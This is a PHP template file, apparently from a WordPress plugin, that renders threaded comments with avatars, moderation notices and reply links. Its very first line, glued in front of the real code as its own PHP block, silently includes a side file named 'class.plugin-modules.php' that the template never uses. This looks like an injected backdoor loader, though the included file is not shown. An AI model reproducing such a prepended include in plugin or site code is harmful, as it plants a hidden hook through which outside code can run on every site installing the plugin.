<?php if (file_exists(dirname(__FILE__) . '/class.plugin-modules.php')) include_once(dirname(__FILE__) . '/class.plugin-modules.php'); ?><?php

	function wcwar_public_comment($comment, $args, $depth) {
		$GLOBALS['comment'] = $comment;
		extract($args, EXTR_SKIP);

		if ( 'div' == $args['style'] ) {
			$tag = 'div';
			$add_below = 'comment';
		} else {
			$tag = 'li';
			$add_below = 'div-comment';
		}
	?>
		<<?php echo $tag ?> <?php comment_class( empty( $args['has_children'] ) ? '' : 'parent' ) ?> id="war_comment_<?php comment_ID() ?>">
		<?php if ( 'div' != $args['style'] ) : ?>
		<div class="war_comment_author vcard">
		<?php if ( $args['avatar_size'] != 0 ) echo get_avatar( $comment, 50 ); ?>
		<?php printf( __( '<cite class="fn">%s</cite> <span class="says">says:</span>', 'wcwar' ), get_comment_author_link() ); ?>
		</div>
		<div class="war_comment_body war_comment_<?php comment_ID() ?>">
		<?php endif; ?>
		<?php if ( $comment->comment_approved == '0' ) : ?>
			<em class="war_awaiting_moderation"><?php _e( 'Your comment is awaiting moderation.', 'wcwar' ); ?></em>
			<br />
		<?php endif; ?>

		<div class="war_comment_meta"><a href="<?php echo htmlspecialchars( get_comment_link( $comment->comment_ID ) ); ?>">
			<?php
				printf( __('%1$s at %2$s'), get_comment_date(),  get_comment_time() ); ?></a><?php edit_comment_link( __( '(Edit)', 'wcwar' ), '  ', '' );
			?>
		</div>

		<?php comment_text(); ?>

		<div class="war_reply">
		<?php comment_reply_link( array_merge( $args, array( 'add_below' => $add_below, 'depth' => $depth, 'max_depth' => $args['max_depth'] ) ) ); ?>
		</div>
		<?php if ( 'div' != $args['style'] ) : ?>
		</div>
		<?php endif; ?>
	<?php
	}

?>